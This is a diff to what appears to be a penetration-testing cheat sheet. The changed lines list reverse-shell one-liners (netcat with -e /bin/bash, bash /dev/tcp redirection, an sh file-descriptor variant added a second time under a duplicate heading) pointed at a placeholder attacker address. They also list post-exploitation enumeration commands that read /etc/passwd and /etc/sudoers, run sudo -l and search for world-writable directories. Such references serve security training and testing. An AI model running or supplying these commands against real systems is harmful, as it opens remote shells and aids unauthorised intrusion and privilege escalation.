@@ -5,6 +5,8 @@ Getting a reverse shell
     *nc <attacker_ip> <port> -e /bin/bash*
     Using bash and TCP sockets
     */bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1*
+    Using bash and TCP sockets
+    *0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196*
     Using sh
     0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196
     Using telnet
@@ -78,10 +80,10 @@ $ /usr/bin/foo
 It works*
 
     Find other uses in the system
-	*$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*
+    *$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*
 
-	World readable/writable files:
-	*$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;*
+    World readable/writable files:
+    *$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;*
     Find world-readable files:
     *$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print*
     Find nobody owned files
